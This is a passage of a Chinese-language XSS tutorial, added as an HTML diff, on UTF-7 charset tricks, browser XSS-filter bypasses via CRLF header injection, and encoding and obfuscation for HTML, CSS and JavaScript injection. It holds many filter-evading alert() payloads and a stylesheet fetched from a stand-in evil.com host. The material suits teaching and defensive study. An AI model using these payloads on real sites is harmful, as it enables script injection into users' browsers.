+<p>父页通过 Content-Type 或 <code>&lt;meta&gt;</code> 标签来声明 UTF-7 编码，然后使用 <code>&lt;iframe&gt;</code> 标签嵌入外部 UTF-7 编码的HTML 文件，代码如下：</p>
+<pre><code class="language-html">&lt;html&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-7&quot;&gt;
+&lt;body&gt;
+&lt;iframe src=&quot; utf-71.html&quot;/&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>utf-71.html 的代码如下：</p>
+<pre><code class="language-html">&lt;html&gt;
++ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
+&lt;/html&gt;
+</code></pre>
+<p>不过现在 IE 限制了 <code>&lt;iframe&gt;</code> 只能嵌入同域内的 UTF-7 编码文件，虽然曾经有通过重定向跳转到外域的方式绕过这个限制。</p>
+<h4 id="3通过-link-方式调用外部-utf-7-编码的-css-文件">3.通过 link 方式调用外部 UTF-7 编码的 CSS 文件</h4>
+<p>通过<code>&lt;link&gt;</code>标签嵌入外部 UTF-7 编码的 CSS文件，此时父页不需要声明 UTF-7 编码方式，代码如下：</p>
+<pre><code class="language-html">&lt;html&gt;
+&lt;title&gt;123&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://www.evil.com/utf7.css&quot; type=&quot;text/css&quot; /&gt;
+&lt;/html&gt;
+</code></pre>
+<p>utf7.css可以在外域，代码如下：</p>
+<pre><code class="language-css">@charset &quot;utf-7&quot;
+body+AHs-x:expression(if(!window.x)+AHs-alert(1)+ADs-window.x=1+ADsAfQ-)+AH0-
+</code></pre>
+<h4 id="4通过指定-bom-文件头">4.通过指定 BOM 文件头</h4>
+<p>BOM 的全称为 Byte Order Mark，即标记字节顺序码，只出现在 Unicode 字符集中，BOM 出现在文件的最开始位置，软件通过识别文件的 BOM 来判断它的 Unicode 字符集编码方式，常见的BOM头如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>字符集编码</th>
+<th>BOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>UTF-8</td>
+<td>EF BB BF 可以不要</td>
+</tr>
+<tr>
+<td>UTF-16LE</td>
+<td>FF FE</td>
+</tr>
+<tr>
+<td>UTF-16BE</td>
+<td>FE FF</td>
+</tr>
+<tr>
+<td>UTF-32LE</td>
+<td>FF FE 00 00</td>
+</tr>
+<tr>
+<td>UTF-32BE</td>
+<td>00 00 FE FF</td>
+</tr>
+<tr>
+<td>UTF-7</td>
+<td>2B 2F 76 和1字节以下：[38|39|2B|2F]<br />这 4 字节的组合翻译为对应的字符是：+/v8、+/v9、+/v+、+/v/</td>
+</tr>
+</tbody>
+</table>
+<p>其中，LE 是 Little Endian，指低位字节在前，高位字节在后；BE是Big Endian，指高位字节在前，低位字节在后。</p>
+<p>相关解析软件如果发现 BOM 是 +/v8 ，就认为目标文档是 UTF-7 编码。</p>
+<p>在实际的攻击场景中，能控制目标网页开头部分的功能如下：</p>
+<ul>
+<li>用户自定义的 CSS 样式文件</li>
+<li>JSON CallBack 类型的链接</li>
+</ul>
+<h2 id="绕过浏览器xss-filter">绕过浏览器XSS Filter</h2>
+<p>IE 和 Chrome 两大浏览器拥有 XSS Filter机制，主要针对反射型 XSS，大体上采用的都是一种启发式的检测，根据用户提交的参数判断是否是潜在的XSS特征，并重新渲染响应内容保证潜在的 XSS 特征不会触发。</p>
+<h3 id="响应头-crlf-注入绕过">响应头 CRLF 注入绕过</h3>
+<p>如果目标网页存在响应头部 CRLF 注入，在 HTTP 响应头注入回车换行符，就可以注入头部：</p>
+<pre><code class="language-http">X-XSS-Protection:0
+</code></pre>
+<p>用于关闭 XSS Filter机制，这也是一种绕过方式。</p>
+<p>例如：</p>
+<pre><code class="language-http">http://x.com/xx.action?id=%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0ax%3Cscript&amp;3Ealert(1);%3C/script%3Ey
+</code></pre>
+<h3 id="针对同域的白名单">针对同域的白名单</h3>
+<p>针对同域的白名单机制不是绕过，而是浏览器的性质。IE 和 Chrome 不太一样。</p>
+<h4 id="1ie的同域白名单">1.IE的同域白名单</h4>
+<p>IE会判断Referer来源是否是本域，如果是，则 XSS Filter不生效。</p>
+<p>如果直接请求<code>xss.php?x=&lt;script&gt;alert(1)&lt;/script&gt;</code> 会被 IE XSS Filter 拦截下来，如果是通过同域内的 <code>&lt;a&gt;</code> 链接点击过来的，或者 <code>&lt;iframe&gt;</code> 直接嵌入，由于Referer 来源是同域，此时 XSS Filter 不生效，代码如下：</p>
+<pre><code class="language-html">&lt;a href=&quot;xss.php?x=&lt;script&gt;alert(1)&lt;/script&gt;&quot; target=&quot;_blank&quot;&gt;xxxx&lt;/a&gt;
+&lt;iframe src=xss.php?x=%3Cscript%3Ealert(1)%3C/script%3E&gt;&lt;/iframe&gt;
+</code></pre>
+<h4 id="2chrome的同域白名单">2.Chrome的同域白名单</h4>
+<p>chrome的同域白名单机制和 IE 完全不一样，用法如下：</p>
+<pre><code class="language-html">xss.php?&lt;scriptsrc=alert.js&gt;&lt;/script&gt;
+</code></pre>
+<p>如果<code>&lt;script&gt;</code> 嵌入同域内的 js 文件，XSS Filter就不会防御，这个受 CSP 策略的影响。</p>
+<h3 id="场景依赖性高的绕过">场景依赖性高的绕过</h3>
+<h4 id="1场景一">1.场景一</h4>
+<p>我们发现一个反射型XSS的参数值出现在JavaScript里，格式如下：</p>
+<pre><code class="language-html">&lt;script&gt;
+var a='[userinput]';
+...
+&lt;/script&gt;
+</code></pre>
+<p>提交<code>xxx.php?userinput=';alert(123)//</code> 得到如下语句：</p>
+<pre><code class="language-html">&lt;script&gt;
+var a='';alert(123)//';
+...
+&lt;/script&gt;
+</code></pre>
+<p>对于这样的场景，Chrome 的XSS Filter就无法有效地防御了，IE却可以</p>
+<h4 id="2场景二">2.场景二</h4>
+<p>如果PHP开启的GPC 魔法引号，那么下面这样的URL可以绕过 IE XSS Filter:</p>
+<pre><code class="language-html">xss.php?x=&lt;script %00%00%00&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>xss.php代码如下：</p>
+<pre><code class="language-php">&lt;?php echo $_GET['x'] ?&gt;
+</code></pre>
+<p>原因是：<code>%00</code> 会被 PHP 转义为 <code>\0</code> ,IE XSS Filter就因此被绕过，最终的输出结果是：</p>
+<pre><code class="language-html">&lt;script \0\0\0&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>除此之外，还有以下一些特性：</p>
+<ul>
+<li>IE 对 DOM XSS没有防御策略，但是 Chrome 就有。</li>
+<li>Chrome 还支持注入 data: 协议的 XSS，不过 data: 协议是空白域，不会对目标造成大的影响。</li>
+</ul>
+<h2 id="混淆的代码">混淆的代码</h2>
+<h3 id="浏览器的进制常识">浏览器的进制常识</h3>
+<p>浏览器中常用的进制混淆有八进制、十进制、十六进制。</p>
+<p>十进制在 HTML 中可使用 <code>&amp;#56;</code>来表示，用 &amp; 和 # 作为前缀，中间为10进制数字，使用半角分号（;）作为后缀，其中后缀也可以没有。</p>
+<p>十六进制使用 <code>&amp;#x5a;</code> 来表示，比十进制多了个x，进制码中多了 a~f 这6个字符来表示 10~15，其中后缀也可以没有，而且x 和 a~f 这几个字符大小写不敏感。</p>
+<p>在 CSS 的属性中，我们也只能用到十进制和十六进制， CSS兼容 HTML 中的进制表示形式，除此之外，十六进制还可以使用 \6c 的形式表示，即使用斜线作为进制数值前缀。</p>
+<p>在 JavaScript 中可以直接通过 eval 执行的字符串有八进制和十六进制两种编码方式，其中八进制用<code>\56</code>表示，十六进制用<code>\x5c</code>表示。需要注意的是，这两种表示方式不能够直接给多字节字符编码（如汉字、韩文等），如果代码中应用了汉字并且需要进行进制编码，那么只能进行十六进制 Unicode 编码，其表示形式为<code>\u4ee3\u7801</code></p>
+<p>除此之外，我们也会遇到其他一些编码形式，如URIEncode，以及用进制数值表示 IP 的格式。</p>
+<p>JavaScript 自身带有两个函数可以将代码转化为进制字符:</p>
+<ul>
+<li>char.toString(jinzhi)   char为需要编码的单字，jinzhi为需要编码的进制</li>
+<li>String.fromCharCode(code,jinzhi)   code为需要进制解码的数字，jinzhi为当前数字的进制</li>
+</ul>
+<h4 id="1html进制用法">1.HTML进制用法</h4>
+<p>举个例子，HTML代码如下：</p>
+<pre><code class="language-html">&lt;img src=http://www.baidu.com/img/logo.png&gt;
+</code></pre>
+<p>转换为十进制：</p>
+<pre><code class="language-html">&lt;img src=&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#058;&amp;#047;&amp;#047;&amp;#119;&amp;#119;&amp;#119;&amp;#046;&amp;#098;&amp;#097;&amp;#105;&amp;#100;&amp;#117;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&amp;#047;&amp;#105;&amp;#109;&amp;#103;&amp;#047;&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#046;&amp;#112;&amp;#110;&amp;#103;&gt;
+</code></pre>
+<p>转换为十六进制：</p>
+<pre><code class="language-html">&lt;img src=&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;#x67;&amp;#x2f;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x2e;&amp;#x70;&amp;#x6e;&amp;#x67;&gt;
+</code></pre>
+<p>当浏览器在运行这两行代码时，两张图片依然能够显示，就说明浏览器自身已经对上述编码做了自动解码。</p>
+<p>HTML自编码中，十进制编码设定了其最小位数为3位，所以不够3位的数值用 0 补充，这在实际的代码混淆中很有用，它可以用来绕过一些站点的过滤器，不过不同的浏览器对所能支持的位数有一定的要求，如 IE 只能支持最大 7 位数值，而对 Chrome 来说，设置位数无限制。</p>
+<p>另外，由于进制方式对字母的大小写不敏感，后缀&quot;;&quot;也不是必需的，并且我们也可以将常规字符、十进制编码和十六进制编码字符混合，所以可以将代码混淆成如下形式：它依然是有效的：</p>
+<pre><code class="language-html">&lt;img src=&amp;#0104;&amp;#0116;&amp;#0116&amp;#0112;&amp;#X00003A;&amp;#x00002F&amp;#x00002f;baidu.com/&amp;#x69;&amp;#x6d;&amp;#X67&amp;#x2f;logo.png&gt;
+</code></pre>
+<h4 id="2css进制用法">2.CSS进制用法</h4>
+<p>例子如下：</p>
+<pre><code class="language-html">&lt;div style=&quot;background:red;&quot;&gt;1&lt;/div&gt;
+</code></pre>
+<p>对其进行十进制编码和十六进制编码的效果分别如下：</p>
+<pre><code class="language-html">&lt;div style=&quot;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#103;&amp;#114;&amp;#111;&amp;#117;&amp;#110;&amp;#100;&amp;#58;&amp;#114;&amp;#101;&amp;#100;&amp;#59;&quot;&gt;1&lt;/div&gt;
+&lt;div style=&quot;\62\61\63\6b\67\72\6f\75\6e\64:\0072\0065\0064;&quot;&gt;1&lt;/div&gt;
+&lt;div style=&quot;&amp;#x62;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x75;&amp;#x6e;&amp;#x64;&amp;#x3a;&amp;#x72;&amp;#x65;&amp;#x64;&amp;#x3b;&quot;&gt;1&lt;/div&gt;
+</code></pre>
+<p>这里需要注意的是，如果使用 <code>\62\61</code> 形式进行十六进制编码，那么要注意将 CSS属性名和属性值之间的冒号留出来，否则代码将不会解析。同样，我们可以把以上三种编码方式混合到一个字符串中，代码依旧可以正确执行。</p>
+<h4 id="3javascript进制用法">3.JavaScript进制用法</h4>
+<p>假设原始语句如下：</p>
+<pre><code class="language-html">&lt;script&gt;eval(&quot;alert('你好')&quot;);&lt;/script&gt;
+</code></pre>
+<p>其八进制和十六进制的代码如下：</p>
+<pre><code class="language-html">&lt;script&gt;eval(&quot;\141\154\145\162\164\050\047\u4f60\u597d\47\51&quot;);&lt;/script&gt;
+&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\u4f60\u597d\x27\x29&quot;);&lt;/script&gt;
+</code></pre>
+<p>其中，中文部分一定要使用 Unicode 的形式，即 <code>\u</code> 加上汉字的十六进制编码。</p>
+<p>另外，虽然十进制不能直接通过eval来执行，但可以使用 String.fromCharCode 函数先对数值进行解码，然后传递给eval执行</p>
+<pre><code class="language-html">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41,59));&lt;/script&gt;
+</code></pre>
+<h3 id="浏览器的编码常识">浏览器的编码常识</h3>
+<p>在 JavaScript 中，有三套编/解码的函数，分别为：</p>
+<ul>
+<li>
+<p>escape/unescape</p>
+</li>
+<li>
+<p>encodeURI/decodeURI</p>
+</li>
+<li>
+<p>encodeURIComponent/decodeURIComponent</p>
+</li>
+</ul>
+<p>我们对字符串 <code>&lt;Hello+World&gt;</code> 用三种加密方式分别进行加密的结果如下所示：</p>
+<table>
+<thead>
+<tr>
+<th>加密方式</th>
+<th>加密结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Escape</td>
+<td>%3CHello+World%3E</td>
+</tr>
+<tr>
+<td>encodeURI</td>
+<td>%3CHello+World%3E</td>
+</tr>
+<tr>
+<td>encodeURIComponent</td>
+<td>%3CHello%2BWorld%3E</td>
+</tr>
+</tbody>
+</table>
+<p>三种加密的方法有少许区别：</p>
+<p><strong>escape不编码的字符有69个：</strong></p>
+<pre><code class="language-html">* + - . / @ _ 0~9 a~z A~Z 而且escape对0~255以外的unicode值进行编码时输出%u****格式
+</code></pre>
+<p><strong>encodeURI不编码的字符有82个：</strong></p>
+<pre><code class="language-html">! # $ &amp; ' ( ) * + , - . / : ; = ? @ _ ~ 0~9 a~z A~Z
+</code></pre>
+<p><strong>encodeURIComponent不编码的字符有71个：</strong></p>
+<pre><code class="language-html">! ' ( ) * - . _ ~ 0~9 a~z A~Z
+</code></pre>
+<p>另外，我们可以编写一个函数来使 escape可以对所有的字符进行编码，代码如下</p>
+<pre><code class="language-javascript">var ExEscape = function(str){
+  var _a,_b;
+  var _c=&quot;&quot;;
+  for (var i = 0; i &lt; str.length; i++) {
+    _a = str.charCodeAt(i);
+    _b = _a &lt; 256 ? &quot;%&quot; : &quot;%u&quot;; //u不可以大写
+    _b = _a &lt; 16 ? &quot;%0&quot; : _b;
+    _c += _b + _a.toString(16).toUpperCase(); //大小写皆可.toLowerCase()
+  }
+  return _c;
+}
+</code></pre>
+<p>这样我们可以使用<code>eval(unescape(%61%6C%65%72%74%28%31%29));</code> 的形式来绕过过滤器对某些关键词的过滤。</p>
+<h3 id="html-中的代码注入技巧">HTML 中的代码注入技巧</h3>
+<p>完整的 HTML 代码分为：标签名、属性名、属性值、文本、注释。</p>
+<p>其中，属性可以是 JavaScript 事件、资源链接或 data 对象。</p>
+<h4 id="1标签">1.标签</h4>
+<p>HTML标签不区分大小写</p>
+<pre><code class="language-html">&lt;script&gt;&lt;/script&gt;
+&lt;SCRIPT&gt;&lt;/ScRiPt&gt;
+</code></pre>
+<p>由于现代浏览器对 XHTML 的支持，使得我们可以在某些浏览器的某些版本中插入 XML 代码、SVG代码或未知标签。如在 IE 6下可以构造如下代码：</p>
+<pre><code class="language-html">&lt;XSS STYLE=&quot;xss:expression(alert('XSS'))&quot;&gt;
+</code></pre>
+<p>我们可以通过 fuzzing 的方式确认究竟哪些标签可用，哪些标签不可用。通常情况下，黑名单的过滤器总会留下漏网之鱼。例如：</p>
+<pre><code class="language-html">&lt;isindex PROMPT='click picture' action=&quot;javascript:alert(1)&quot; src=&quot;http://www.baidu.com/img/logo.png&quot; style=&quot;width:290;height:171&quot; type=&quot;image&quot;&gt;
+&lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&gt;
+&lt;META HTTP-EQUIV='refresh' CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&gt;
+</code></pre>
+<p>有些过滤器的 HTML Parser 很强大，会判断当前代码段是否存在于注释中，如果是注释，则忽略，这样做的目的是为了维持用户数据的最大完整性，但是却给了我们可乘之机。如有些过滤器的判断注释的方法为：<code>&lt;!--.*--&gt;</code> ，但注释可以这样写：<code>bbb&lt;!-- aaa &lt;!-- aaa--&gt;ccc --&gt;bbb</code> ，这样 “ccc” 代码就暴露出来可以执行了。</p>
+<p>而与之相反，有些HTML Parser不关心是否有注释，只关心 HTML标签、属性、属性值是否有问题，如标签是否是<code>&lt;script&gt;</code> ，属性是否是 JavaScript 事件，属性值是否是伪协议等，但是由于注释优先级较高，我们可以构造以下一段代码：</p>
+<pre><code class="language-html">&lt;!--&lt;a href=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;test&lt;/a&gt;
+</code></pre>
+<p>扫描器忽略了 HTML 注释后，会认为下面这段是一个完整的 HTML语句</p>
+<pre><code class="language-html">&lt;a href=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;test&lt;/a&gt;
+</code></pre>
+<p>还有一种特殊的注释：IE HTML条件控制语句</p>
+<pre><code class="language-html">&lt;!--[if IE]&gt;所有的IE可识别&lt;![endif]--&gt;
+&lt;!--[if IE 6]&gt;仅IE6可识别&lt;![endif]--&gt;
+&lt;!--[if lt IE 6]&gt;IE6 以及 IE6 以下版本可识别&lt;![endif]--&gt;
+&lt;!--[if gte IE 6]&gt;IE6 以及 IE6 以上版本可识别&lt;![endif]--&gt;
+</code></pre>
+<p>这是IE独有的，执行方式如下：</p>
+<pre><code class="language-html">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt;
+&lt;!--[if]&gt;&lt;img src=x onerror=alert(1)//]&gt; --&gt;
+</code></pre>
+<p>在 HTML 语法中有标签优先级的概念，有些标签如<code>&lt;textarea&gt;、&lt;title&gt;、&lt;style&gt;、&lt;script&gt;、&lt;xmp&gt;</code> 等具有非常高的优先级，使得其结束标签可以直接中断其他的标签的属性：</p>
+<pre><code class="language-html">&lt;title&gt;&lt;ahref=&quot;&lt;/title&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;
+&lt;style&gt;&lt;ahref=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;
+</code></pre>
+<p>如果过滤器将如上标签也过滤了，那么我们也可以尝试一下这些方式：</p>
+<pre><code class="language-html">&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;% foo=&quot;%&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+</code></pre>
+<p>前三种可在 Firefox 和 Webkit 浏览器中执行，第四种可以在 IE 中执行。如果过滤器是基于黑名单过滤的，那么有可能会忽略这些。</p>
+<h4 id="2属性">2.属性</h4>
+<p>HTML标签中的属性同样也是大小写不敏感的，并且属性值可以用双引号引起来，也可以用单引号，甚至不用引号在HTML语法上也是正确的。而且在 IE 下面还可以用反引号来包括属性值，形式分别如下：</p>
+<pre><code class="language-html">&lt;img src=&quot;#&quot;&gt;
+&lt;img SRC='#'&gt;
+&lt;img sRC=#&gt;
+&lt;img src=`#`&gt;
+</code></pre>
+<p>此外，标签和属性之间、属性名和等号之间、等号和属性值之间可以用空格、换行符（chr(13)）、回车符（chr(10)）、或者 tab （chr(9)）等，并且个数不受限制。</p>
+<p>这样的混淆方法是可以在各大浏览器上执行的。另外，我们还可以在属性值的头部和尾部（引号里面）插入系统控制字符，即 ASCII 值为 1~32 这32 个控制字符，不同的浏览器都有各自的处理方式，如下：</p>
+<pre><code class="language-html">&lt;a &amp;#8 href=&quot;&amp;#32javascript:alert(1)&quot;&gt;test&lt;/a&gt;
+</code></pre>
+<p>是可以在 IE、Firefox、Chrome 下执行的，但语句：</p>
+<pre><code class="language-html">&lt;a &amp;#8 href=&quot;&amp;#32javascript:alert(1)&amp;#27&quot;&gt;test&lt;/a&gt;
+</code></pre>
+<p>就仅可以在 IE 和 Firefox 下执行。</p>
+<p>HTML属性按用途分，大致可以分普通属性、事件属性、资源属性几种。</p>
+<p>对于<strong>普通属性</strong>，如果我们可以控制的变量是属性值，那么我们能做的就只能是突破当前属性，尝试去构造新属性或者新标签。但如果属性值是被引号包括的，对方也过滤了引号，或者做了 HTMLEncode转义，那么既没有XSS 安全隐患，也没有可以利用的方式。</p>
+<p>不过目前这里至少有两个特例：</p>
+<pre><code class="language-html">&lt;img src=&quot;x` ` &lt;script&gt;alert(1)&lt;/script&gt;&quot;` `&gt;   (IE 6)
+&lt;img src= alt=&quot; onerror=alert(1)//&quot;&gt; (IE、Firefox、Chrome、Opera等)
+</code></pre>
+<p>如果我们所能控制的是<strong>事件属性</strong>，除了突破属性之外，最直接的手段就是直接插入我们的代码。</p>
+<p>例子：</p>
+<pre><code class="language-php+HTML">&lt;a href=&quot;#&quot; onclick=&quot;do_some_func(\'&lt;?=$_GET['a']?&gt;\')&quot;&gt;test&lt;/a&gt;
+</code></pre>
+<p>针对这个例子构造参数，结果为：</p>
+<pre><code class="language-html">&lt;a href=&quot;#&quot; onclick=&quot;do_some_func('x');alert(1);//')&quot;&gt;test&lt;/a&gt;
+&lt;a href=&quot;#&quot; onclick=&quot;do_some_func('',alert(1),'')&quot;&gt;test&lt;/a&gt;
+</code></pre>
+<p>第一段代码将之前的函数闭合，然后构造自己的新代码。第二段代码利用了一个函数可以在另一个函数中执行的特性，也就是JavaScript中的匿名函数。</p>
+<p>还有一个常识，HTML中通过属性定义的事件在执行时会做 HTMLDecode编码，这意味着我们的代码被转义为如下形式，依旧可以执行。</p>
+<pre><code class="language-html">&lt;a href=&quot;#&quot; onclick=&quot;do_some_func('&amp;#039;,alert(1),&amp;#039;)&quot;&gt;test&lt;/a&gt;
+</code></pre>
+<p>对于<strong>资源类属性</strong>，我们可以理解为属性值需要为 URL 的属性，通常，属性名都为 src 或 href 。这类属性一般都支持浏览器的预定义协议，包括 http: ftp: file: https: javascript: vbscript: mailto: data: 等。</p>
+<p>有一些是网络交互协议，有一些是本地协议，我们称本地协议为伪协议，由于其可以调用本地程序执行命令这一点，使得它成为我们在 XSS 中利用的对象。</p>
+<p>常见的支持资源属性的 HTML 标签举例：</p>
+<pre><code class="language-html">APPLET,EMBED,FRAME,IFRAME,IMG,
+INPUT type=image,
+XML,A,LINK,AREA,
+TABLE\TR\TD\TH 的 BACKGROUND 属性,
+BGSOUND,AUDIO,VIDEO,OBJECT,META refresh,SCRIPT,BASE,SOURCE
+</code></pre>
+<p>同 HTML 标签和属性的特点相似，伪协议的协议名也是不区分大小写的，并且跟事件相仿，数据也可以做自动的 HTMLDecode 解码以及进制解码，所以我们可以有多种利用方法：</p>
+<pre><code class="language-html">&lt;iframe src=&quot;jAVasCriPt:alert('xss')&quot;&gt;
+&lt;iframe src=&quot;javascript:&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(&amp;quot;&amp;#88&amp;#83&amp;#83&amp;quot;)&quot;&gt;
+&lt;iframe src=&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;&gt;
+</code></pre>
+<p>另外有几个不常用的属性也支持伪协议：</p>
+<pre><code class="language-html">&lt;img dynsrc=&quot;javascript:alert('xss')&quot;&gt; (IE6)
+&lt;img lowsrc=&quot;javascript:alert('xss')&quot;&gt; (IE6)
+&lt;isindex action=javascript:alert(1) type=image&gt;
+</code></pre>
+<p>有时在过滤器仅过滤了 src 和 href 中的伪协议时，我们可以用这种属性绕过。还有一些常用标签的不常见属性：</p>
+<pre><code class="language-html">&lt;input type=&quot;image&quot; src=&quot;javascript:alert('xss');&quot;&gt;
+</code></pre>
+<h4 id="3html事件">3.HTML事件</h4>
+<p>另一种特殊的 HTML 属性是事件属性，一般以 on 开头，它继承了普通 HTML 属性的所有特点：大小写不敏感，引号不敏感等。</p>
+<p>如果我们想知道对方的过滤器过滤了哪些事件属性，最简单的方式是用 fuzzing机制，使用</p>
+<pre><code class="language-html">&lt;div on****=&quot;aaa&quot;&gt;a&lt;/div&gt;
+</code></pre>
+<p>这种形式将所有的事件都生成出来，然后试探目标站点都过滤了哪些。</p>
+<p>也可以使用 onabcd 这样的假事件属性构造语句，如果过滤了，说明对方的过滤器可能使用了白名单，或者是把所有以 on 开头的属性全部过滤掉了。</p>
+<h3 id="css-中的代码注入技巧">CSS 中的代码注入技巧</h3>
+<p>以一段 CSS为例</p>
+<pre><code class="language-css">@charset &quot;UTF-8&quot;;
+body{
+    background:red;
+    font-size:16px;
+}
+a{
+    font-size:14px!important;
+}
+</code></pre>
+<p>其中，body 和 a 为选择符；background、font-size为属性名，后面为属性值；@charset为规则；!important为声明。其中能被我们利用插入XSS脚本的地方只有 CSS 资源类属性值和 @import 规则，以及一个只能在 IE 浏览器下执行的属性值 expression。</p>
+<p>另外，@charset这个规则虽然不能被利用插入XSS 代码，但是在某种情况下会对我们绕过过滤器给予很大的帮助。</p>
+<p>与 HTML 类似，CSS 的语法同样对大小写不敏感，属性值对单双引号不敏感，对资源类属性来说，URL部分的单双引号以及没有引号也都不敏感，并且凡是可以使用空格的地方使用 tab 制表符、回车和换行也都可以被浏览器解析。</p>
+<h4 id="1css-资源类属性">1.CSS 资源类属性</h4>
+<p>CSS 的一些资源类属性的 XSS 利用也是通过 伪协议来完成的，这种方式目前只能在 IE 下被执行，并且 IE 9 已经可以防御住，这类属性基本上都是设置背景图片的属性，如 background、background-image、list-style-image 等。关键字主要有 2 个，javascript、vbscript，其用法大致如下：</p>
+<pre><code class="language-css">body{background-image:url('javascript:alert(1)');}
+BODY{BACKGROUND-image:url(JavaSCRiPt:alert(1));}
+BODY{BACKGROUND-image:url(vbscript:msgbox(2));}
+li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}
+</code></pre>
+<p>CSS还有一类资源类属性可以嵌入 XML、CSS或者 JavaScript如 IE 独有的 behavior 以及规则@import。</p>
+<p>behavior 引入的是一段含 JavaScript 的代码片段。需要注意的是，引用的文件不能够跨域，且路径是相对于 CSS 文件的路径或者是绝对路径，格式如下：</p>
+<pre><code class="language-css">&lt;PUBLIC:COMPONENT lightWeight='true'&gt;
+&lt;PUBLIC:ATTACH EVENT=&quot;ondocumentready&quot; FOR=&quot;element&quot; ONEVENT=&quot;main()&quot; /&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function main(){
+    alert(&quot;XSS&quot;);
+}
+&lt;/script&gt;
+&lt;/PUBLIC:COMPONENT&gt;
+</code></pre>
+<p>而规则@import 引入的是一段 CSS 代码，利用方式与正常的 CSS 利用相同。</p>
+<p>由于在 CSS 属性名的任何地方都可以插入反斜线 “\” 以及反斜线 +0 的各种组合，如：</p>
+<pre><code class="language-css">@\imp\ort &quot;url&quot;;
+@Imp\0000orT &quot;url&quot;;
+@\i\0\M\00p\000o\0000\00000R\000000t &quot;url&quot;
+</code></pre>
+<h4 id="2expression">2.expression</h4>
+<p>expression是 IE 所独有的 CSS 属性，其目的就是为了插入一段 JavaScript 代码，示例如下：</p>
+<pre><code class="language-css">a{text:expression(target=&quot;_blank&quot;);}
+</code></pre>
+<p>当在 IE 下执行这段 CSS 后，它会给所有的链接都加上 target=“_blank” 属性。如果替换 alert(1) ,那么刷新页面后就会不断地弹出窗口。</p>
+<p>expression中的代码相当于一段 JavaScript 匿名函数在当前页面的生命周期内是不断循环执行的。</p>
+<p>如何打断？使用下面的代码：</p>
+<pre><code class="language-css">expression(if(window.x!=1){alert(1);window.x=1;});
+</code></pre>
+<p>我们可以使用注释来进行混淆</p>
+<pre><code class="language-css">body{xss:e/**/xpression((window.x==1)?'':eval('x=1;alert(2);'));}
+body{/*a*/x/*a*/ss/*a*/:/*a*/e/**/xpression/*a*/((window.x==1)?'':eval('x=1;alert(2);'));}
+</code></pre>
+<p>而且在 IE 6 下甚至可以用全角字符来混淆 expression关键字，也可以执行，达到绕过过滤器的目的。</p>
+<p>同样可以使用 UTF-7 编码达到绕过过滤器的目的。</p>
+<h3 id="javascript-中的代码注入技巧">JavaScript 中的代码注入技巧</h3>
+<p>当 XSS 点出现在 JavaScript 代码的变量中时，只要我们可以顺利闭合之前的变量，接下来就可以插入我们的代码了。</p>
+<p>如果对方的站点使用了 addslashes，这样单引号、双引号和反斜线前面都会增加一条反斜线，这种情况可以采用宽字节的方式吃掉反斜线。</p>
+<p>或者也可以使用下面的语句：</p>
+<pre><code class="language-html">var a = &quot;123&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;;
+</code></pre>
+<p>对 HTML 页面中的 JavaScript 代码来说，<code>&lt;/script&gt;</code>闭合标签具有最高优先级，可以在任何位置中断 JavaScript 代码。</p>
+<h4 id="1json">1.JSON</h4>
+<p>根据需求的不同，JSON大体上有两种格式：没有 callback 函数名的 裸Object 形式，和有 callback 函数名的参数调用 Object 的形式，格式如下：</p>
+<pre><code class="language-json">[{&quot;a&quot;:&quot;b&quot;}]
+callback([{&quot;a&quot;:&quot;b&quot;}])
+</code></pre>
+<p>后者的存在主要是为了跨域数据传输的需要。</p>
+<p>一些应用为了维持数据接口的定制性，通常会让数据请求方在请求参数中提供 callback 函数名，而不是由数据提供方定制，如请求方发起请求：</p>
+<pre><code class="language-http">get_json.php?id=123&amp;call_back=some_function
+</code></pre>
+<p>数据提供方提供数据的 callback 格式为：</p>
+<pre><code class="language-json">some_function([{'id':123,data:'some_data'}]);
+</code></pre>
